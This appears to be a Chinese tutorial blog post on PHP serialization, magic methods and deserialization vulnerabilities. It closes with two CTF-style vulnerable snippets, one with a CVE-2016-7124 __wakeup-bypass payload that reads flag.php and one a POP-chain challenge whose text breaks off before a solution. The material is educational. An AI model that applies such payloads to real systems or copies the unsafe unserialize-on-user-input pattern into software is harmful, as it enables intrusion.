  PHP序列化：php为了方便进行数据的传输，允许把复杂的数据结构，压缩到一个字符串中，使用serialize()函数。 PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用unserialize()函数。 PHP反序列化漏洞：如果代码中使用了反序列化 unserialize()函数，并且参数可控，且程序没有对用户输入的反序列化字符串进行校验，那么可以通过在本地构造序列化字符串，同时利用PHP中的一系列magic方法来达到想要实现的目的，如控制对象内部的变量甚至是函数。  序列化格式 &amp;lt;?php $str=&amp;#39;Theoyu&amp;#39;; $bool=true; $null=NULL; $arr=array(&amp;#39;a&amp;#39;=&amp;gt;1,&amp;#39;b&amp;#39;=&amp;gt;2); class A { public $x; private $y; public function __construct($x,$y) { $this-&amp;gt;x=$x; $this-&amp;gt;y=$y; } } $test=new A(3,&amp;#34;theoyu&amp;#34;); echo(serialize($str).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //s:6:&amp;#34;Theoyu&amp;#34;; echo(serialize($bool).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //b:1; echo(serialize($null).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //N; echo(serialize($arr).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //a:2{s:1:&amp;#34;a&amp;#34;;i:1;s:1:&amp;#34;b&amp;#34;;i:2;} echo(serialize($test).&amp;#39;&amp;lt;/br&amp;gt;&amp;#39;); //O:1:&amp;#34;A&amp;#34;:2:{s:1:&amp;#34;x&amp;#34;;i:3;s:4:&amp;#34;Ay&amp;#34;;s:6:&amp;#34;theoyu&amp;#34;;}  ?&amp;gt;序列化对不同类型得到的字符串格式为：
 string ： s:size:value; Integer： i:value; Boolean b:value;(1 or 0) NULL N; Array a:size:{key definition;value definition;······}definition 类似string or Integer Object O:类名长度:&amp;ldquo;类名&amp;rdquo;:属性数量:{属性类型:属性名长度:属性名:value definition······}  Magic methods PHP16个魔术方法 PHP中把比双下划线__开头的方法称为魔术方法，这些发在达到某些条件时会自动被调用：</description>
			<content type="html"><![CDATA[<h2 id="基础知识">基础知识</h2>
<blockquote>
<p>现在我们都会在淘宝上买桌子，这时候一般都会把它拆掉成板子，再装到箱子里面，就可以快递寄出去了，这个过程就类似我们的序列化的过程（把数据转化为可以存储或者传输的形式）。当买家收到货后，就需要自己把这些板子组装成桌子的样子，这个过程就像反序列的过程（转化成当初的数据对象）。</p>
<p>也就是说，序列化的目的是方便传输和存储。</p>
<p>在PHP应用中，序列化和反序列化一般用做缓存，比如session，cookie等。</p>
</blockquote>
<ul>
<li>PHP序列化：php为了方便进行数据的传输，允许把复杂的数据结构，压缩到一个字符串中，使用<code>serialize()</code>函数。</li>
<li>PHP反序列化：将被压缩为字符串的复杂数据结构，重新恢复，使用<code>unserialize()</code>函数。</li>
<li>PHP反序列化漏洞：如果代码中使用了反序列化 <code>unserialize()</code>函数，并且参数可控，且程序没有对用户输入的反序列化字符串进行校验，那么可以通过在本地构造序列化字符串，同时利用PHP中的一系列<strong>magic</strong>方法来达到想要实现的目的，如控制对象内部的变量甚至是函数。</li>
</ul>
<h2 id="序列化格式">序列化格式</h2>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="nv">$str</span><span class="o">=</span><span class="s1">&#39;Theoyu&#39;</span><span class="p">;</span>
<span class="nv">$bool</span><span class="o">=</span><span class="k">true</span><span class="p">;</span>
<span class="nv">$null</span><span class="o">=</span><span class="k">NULL</span><span class="p">;</span>
<span class="nv">$arr</span><span class="o">=</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">=&gt;</span><span class="mi">1</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="o">=&gt;</span><span class="mi">2</span><span class="p">);</span>

<span class="k">class</span> <span class="nc">A</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$x</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$y</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$x</span><span class="p">,</span><span class="nv">$y</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">x</span><span class="o">=</span><span class="nv">$x</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">y</span><span class="o">=</span><span class="nv">$y</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="nv">$test</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="s2">&#34;theoyu&#34;</span><span class="p">);</span>      
<span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>    <span class="c1">//s:6:&#34;Theoyu&#34;;
</span><span class="c1"></span><span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$bool</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>   <span class="c1">//b:1;
</span><span class="c1"></span><span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$null</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>   <span class="c1">//N;
</span><span class="c1"></span><span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$arr</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>    <span class="c1">//a:2{s:1:&#34;a&#34;;i:1;s:1:&#34;b&#34;;i:2;}
</span><span class="c1"></span><span class="k">echo</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$test</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&lt;/br&gt;&#39;</span><span class="p">);</span>   <span class="c1">//O:1:&#34;A&#34;:2:{s:1:&#34;x&#34;;i:3;s:4:&#34;Ay&#34;;s:6:&#34;theoyu&#34;;}
</span><span class="c1"></span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>序列化对不同类型得到的字符串格式为：</p>
<ul>
<li>string ：   s:size:value;</li>
<li>Integer：  i:value;</li>
<li>Boolean   b:value;(1 or 0)</li>
<li>NULL       N;</li>
<li>Array       a:size:{key definition;value definition;······}definition 类似string or Integer</li>
<li>Object      O:类名长度:&ldquo;类名&rdquo;:属性数量:{属性类型:属性名长度:属性名:value definition······}</li>
</ul>
<h2 id="magic-methods">Magic methods</h2>
<h3 id="php16个魔术方法">PHP16个魔术方法</h3>
<p>PHP中把比双下划线__开头的方法称为魔术方法，这些发在达到某些条件时会自动被调用：</p>
<ol>
<li>__construct():类的构造函数，当一个类被创建时自动调用</li>
<li>__destruct)(),类的析构函数，当一个类被销毁时自动调用</li>
<li>__sleep()，执行serialize()进行序列化时，先会调用这个函数</li>
<li>__wakeup()，执行unserialize()进行反序列化时，先会调用这个函数</li>
<li>__toString()，当把一个对象被当作字符串时被自动调用</li>
<li>__invoke()，当把一个类当作函数使用时自动调用</li>
<li>__call()，在对象中调用一个不可访问方法时调用</li>
<li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li>
<li>__get()，获得一个类的不可访问成员变量时调用(不存在或为private)</li>
<li>__set()，设置一个类的成员变量时调用(不存在或为private)</li>
<li>__isset()，当对不可访问属性调用isset()或empty()时调用</li>
<li>__unset()，当对不可访问属性调用unset()时被调用。</li>
<li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li>
<li>__clone()，当对象复制完成时调用</li>
<li>__autoload()，尝试加载未定义的类</li>
<li>__debugInfo()，打印所需调试信息
几个常用的魔术方法具体实现。</li>
</ol>
<p><code> __construct()</code></p>
<blockquote>
<p>类似c++的构造函数</p>
<p><strong>需要指出</strong>，PHP不支持构造函数重载，所以一个类只能声明<strong>一个</strong>构造函数！</p>
</blockquote>
<p><code>__destruct()</code></p>
<blockquote>
<p>同上，类似c++..</p>
</blockquote>
<p><code>__sleep()</code></p>
<blockquote>
<p>serialize()函数会检查类中是否存在一个魔术方法__sleep(),如果存在，则该方法会优先被调用。</p>
</blockquote>
<ul>
<li>该函数必须至少返回一个所包含对象中的变量名称</li>
<li>没有返回的变量将不会输出。</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">Person</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$sex</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$age</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$sex</span><span class="p">,</span><span class="nv">$age</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nv">$name</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sex</span><span class="o">=</span><span class="nv">$sex</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span><span class="o">=</span><span class="nv">$age</span><span class="p">;</span>       
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__sleep</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span><span class="s2">&#34;我是__sleep()函数，我被调用了,你以为你还叫theoyu？&lt;br&gt;&#34;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span><span class="s1">&#39;sex&#39;</span><span class="p">);</span><span class="c1">//没有返回age
</span><span class="c1"></span>    <span class="p">}</span>


<span class="p">}</span>
<span class="nv">$person</span> <span class="o">=</span><span class="k">new</span> <span class="nx">Person</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">,</span><span class="s1">&#39;男&#39;</span><span class="p">,</span><span class="s1">&#39;20&#39;</span><span class="p">);</span>
<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$person</span><span class="p">)</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>输出：</p>
<div class="highlight"><pre class="chroma"><code class="language-txt" data-lang="txt">我是__sleep()函数，我被调用了,你以为你还叫theoyu？
O:6:&#34;Person&#34;:2 :{s:4:&#34;name&#34;;s:8:&#34;dGhlb3l1&#34;;s:3:&#34;sex&#34;;s:3:&#34;男&#34;;}
</code></pre></div><p>没有年龄。</p>
<p><code>__wakeup()</code></p>
<blockquote>
<p>unserialize()前会检查是否存在__wakeup()，如果存在会优先调动。</p>
<p>和__sleep()相比，不需要返回数组。</p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">Person</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$sex</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$age</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$sex</span><span class="p">,</span><span class="nv">$age</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nv">$name</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sex</span><span class="o">=</span><span class="nv">$sex</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span><span class="o">=</span><span class="nv">$age</span><span class="p">;</span>       
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__sleep</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span><span class="s2">&#34;我是__sleep()函数，我被调用了,你以为你还叫theoyu？&lt;br&gt;&#34;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
        <span class="k">return</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span><span class="s1">&#39;sex&#39;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">echo</span><span class="s2">&#34;我是__wakeup()函数，你重新拥有了你的名字&lt;br&gt;&#34;</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="o">=</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">));</span> <span class="c1">//这里需要两次解码，因为__sleep()调用了两次
</span><span class="c1"></span>    <span class="p">}</span>


<span class="p">}</span>
<span class="nv">$person</span> <span class="o">=</span><span class="k">new</span> <span class="nx">Person</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">,</span><span class="s1">&#39;男&#39;</span><span class="p">,</span><span class="s1">&#39;20&#39;</span><span class="p">);</span>
<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$person</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nx">unserialize</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$person</span><span class="p">)));</span>

<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>输出：</p>
<pre><code>我是__sleep()函数，我被调用了,你以为你还叫theoyu？
O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:8:&quot;dGhlb3l1&quot;;s:3:&quot;sex&quot;;s:3:&quot;男&quot;;}
我是__sleep()函数，我被调用了,你以为你还叫theoyu？
我是__wakeup()函数，你重新拥有了你的名字
object(Person)#2 (3) { [&quot;name&quot;]=&gt; string(6) &quot;theoyu&quot; [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;age&quot;]=&gt; NULL }
</code></pre><p>&hellip;忽然发现好中二= =</p>
<p><code>__toString()</code></p>
<ul>
<li><strong>__toString()</strong> 用于一个对象被当作字符串时应该如何回应，应该显示什么。</li>
<li><strong>__toString()</strong> 必须返回一个字符串。</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="k">class</span> <span class="nc">A</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$test</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">=</span><span class="nv">$test</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$str</span><span class="o">=</span><span class="s2">&#34;this is __toString&#34;</span><span class="p">;</span>
            <span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>    <span class="c1">//__toString() must return a string value
</span><span class="c1"></span>        <span class="p">}</span>

    <span class="p">}</span>
     <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
     <span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>         <span class="c1">//this is __toString
</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><code>__invoke()</code></p>
<ul>
<li>一个对象被当作函数调用时，<strong>__invoke()</strong> 会自动被调用。</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="k">class</span> <span class="nc">A</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$test</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">=</span><span class="nv">$test</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&#34;this is __invoke&#34;</span><span class="p">;</span>
        <span class="p">}</span>

    <span class="p">}</span>
     <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
     <span class="nv">$a</span><span class="p">();</span>         <span class="c1">//this is __invoke
</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><code> __call()</code></p>
<ul>
<li>调用类不存在的函数时，__call()会被调用，保证程序正常进行。</li>
<li>格式 <strong>function __call($function_name,$arguments)</strong></li>
<li>第一个参数会自动接收不存在函数的函数名，第二个参数以<strong>数组</strong>方式接收不存在函数的多个参数。</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="k">class</span> <span class="nc">A</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="nv">$test</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$test</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">test</span><span class="o">=</span><span class="nv">$test</span><span class="p">;</span>

        <span class="p">}</span>
        <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$funcion_name</span><span class="p">,</span><span class="nv">$arguments</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">echo</span><span class="s2">&#34;你调用的函数:&#34;</span><span class="o">.</span><span class="nv">$funcion_name</span><span class="o">.</span><span class="s2">&#34;(参数:&#34;</span><span class="p">;</span>
            <span class="nx">print_r</span><span class="p">(</span><span class="nv">$arguments</span><span class="p">);</span> <span class="c1">//数组要用print_r()
</span><span class="c1"></span>            <span class="k">echo</span> <span class="s2">&#34;)不存在！&#34;</span><span class="p">;</span>
        <span class="p">}</span>
     <span class="p">}</span>

     <span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span> 
     <span class="nv">$a</span><span class="o">-&gt;</span><span class="na">person</span><span class="p">(</span><span class="s1">&#39;name&#39;</span><span class="p">,</span><span class="s1">&#39;age&#39;</span><span class="p">,</span><span class="s1">&#39;sex&#39;</span><span class="p">);</span>
     <span class="c1">//你调用的函数:person(参数:Array ( [0] =&gt; name [1] =&gt; age [2] =&gt; sex ) )不存在！
</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p><code>__get()</code></p>
<ul>
<li>访问private对象。</li>
<li>访问不存在对象。</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">Person</span>
<span class="p">{</span>
    <span class="k">private</span> <span class="nv">$name</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$age</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="o">=</span><span class="s2">&#34;theoyu&#34;</span><span class="p">,</span> <span class="nv">$age</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="nv">$age</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="o">.</span><span class="s2">&#34;__get()&#34;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$man</span><span class="o">=</span><span class="k">new</span> <span class="nx">Person</span><span class="p">();</span>
<span class="k">echo</span> <span class="nv">$man</span><span class="o">-&gt;</span><span class="na">age</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$man</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
<span class="k">echo</span> <span class="nv">$man</span><span class="o">-&gt;</span><span class="na">sex</span><span class="p">;</span>
<span class="cm">/*
</span><span class="cm">1
</span><span class="cm">__get()
</span><span class="cm">__get()
</span><span class="cm">*/</span>

</code></pre></div><h2 id="反序列化漏洞">反序列化漏洞</h2>
<h3 id="eg1">e.g.1</h3>
<ul>
<li><strong>CVE-2016-7124漏洞</strong>：当序列化字符串中表示<strong>对象属性个数的值</strong>大于<strong>真实的属性个数</strong>时会<strong>跳过</strong>__wakeup的执行。</li>
<li>
<blockquote>
<p>要求版本:PHP5&lt;5.6.25   PHP7&lt;7.0.10</p>
</blockquote>
</li>
<li>index.php:</li>
</ul>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
    <span class="k">class</span> <span class="nc">loudong</span>
    <span class="p">{</span>
        <span class="k">public</span> <span class="nv">$file</span> <span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
        <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="k">if</span><span class="p">(</span><span class="nx">strchr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\\</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nx">strchr</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">===</span><span class="k">false</span><span class="p">)</span>
                <span class="p">{</span>
                    <span class="k">echo</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
                    <span class="nx">show_source</span><span class="p">(</span><span class="nx">dirname</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="p">);</span>
                <span class="p">}</span>
                <span class="k">else</span>
                    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Wrong filename&#39;</span><span class="p">);</span>
            <span class="p">}</span> 
        <span class="p">}</span>
        <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file</span><span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="k">return</span> <span class="s1">&#39;this is tostring&#39;</span><span class="p">;</span>
        <span class="p">}</span>
        

    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span>
    <span class="p">{</span>
        <span class="nx">show_source</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
        <span class="k">echo</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
    <span class="p">}</span>

<span class="cp">?&gt;</span><span class="err">  &lt;!-- key in flag.php --&gt;
</span></code></pre></div><p>分析其中的几个函数<strong>strchr(&lsquo;a&rsquo;,&lsquo;b&rsquo;)</strong>:在a中搜索字串b，搜索成功返回剩下字串，失败return false。</p>
<p><strong>代码审计</strong></p>
<ol>
<li>提示flag在flag.php里面，我们要想办法读到里面的内容。</li>
<li>在析构函数中，<strong>show_source(dirname(<strong>FILE</strong>).'/'.$this-&gt;file)</strong>,<strong>dirname</strong>返回的是文件所在文件夹的绝对路径，拼接后面的 <strong>/$this-&gt;file</strong> ,想办法看能不能把file改为flag.php.</li>
<li>在 <strong>__wakeup()</strong> 中，反系列化会自动调用把file置为index.php，那我们希望绕过这个函数。</li>
</ol>
<p><strong>这里需要用到CVE-2016-7124漏洞</strong></p>
<blockquote>
<p>当序列化字符串中表示对象属性个数大于真实的属性个数或值类型不匹配时会跳过__wakeup的执行.</p>
</blockquote>
<ul>
<li>正常构造序列化对象:<code>O:7:&quot;loudong&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code></li>
<li>绕过:<code>O:7:&quot;loudong&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code>//或i:8:&ldquo;flag.php都可</li>
</ul>
<h3 id="eg2">e.g.2</h3>
<p>一道考察多方面的题</p>
<div class="highlight"><pre class="chroma"><code class="language-PHP" data-lang="PHP"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">start_gg</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$mod2</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
        <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span><span class="o">-&gt;</span><span class="na">test1</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">Call</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$mod2</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="nf">test1</span><span class="p">()</span>
        <span class="p">{</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span><span class="o">-&gt;</span><span class="na">test2</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>    
<span class="k">class</span> <span class="nc">funct</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$mod2</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$test2</span><span class="p">,</span><span class="nv">$arr</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="nv">$s1</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span><span class="p">;</span>
                <span class="nv">$s1</span><span class="p">();</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">func</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$mod1</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$mod2</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">()</span>
        <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod2</span> <span class="o">=</span> <span class="s2">&#34;字符串拼接&#34;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mod1</span><span class="p">;</span>
        <span class="p">}</span> 
<span class="p">}</span>
<span class="k">class</span> <span class="nc">string1</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$str1</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$str2</span><span class="p">;</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
        <span class="p">{</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str1</span><span class="o">-&gt;</span><span class="na">get_flag</span><span class="p">();</span>
                <span class="k">return</span> <span class="s2">&#34;1&#34;</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">GetFlag</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="k">function</span> <span class="nf">get_flag</span><span class="p">()</span>
        <span class="p">{</span>
                <span class="k">include</span><span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;string&#39;</span><span class="p">];</span>
<span class="nx">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
